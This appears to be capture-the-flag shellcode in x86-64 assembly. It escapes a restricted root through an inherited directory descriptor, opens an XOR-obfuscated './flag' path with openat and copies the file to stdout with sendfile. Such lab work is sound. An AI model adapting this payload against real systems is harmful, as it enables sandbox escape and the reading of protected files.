# 需要利用已打开的文件的dirfd描述符, 获取该描述符, 然后用openat这类函数来带路径访问

.global _start
_start:
.intel_syntax noprefix
        xor rax, rax
        mov ax, 257
        mov rdi, 3  # 之前打开的文件描述符
        mov rsi, 0x010166606d672e2f
        push rsi
        mov rsi, 0x0101010101010101
        xor [rsp], rsi
        mov rsi, rsp
        xor edx, edx
        xor r10, r10
        syscall
        mov esi, eax
        mov ax, 40
        xor edi, edi
        inc edi
        mov r10w, 0x3e8
        syscall
        mov ax, 60
        xor edi, edi
        syscall
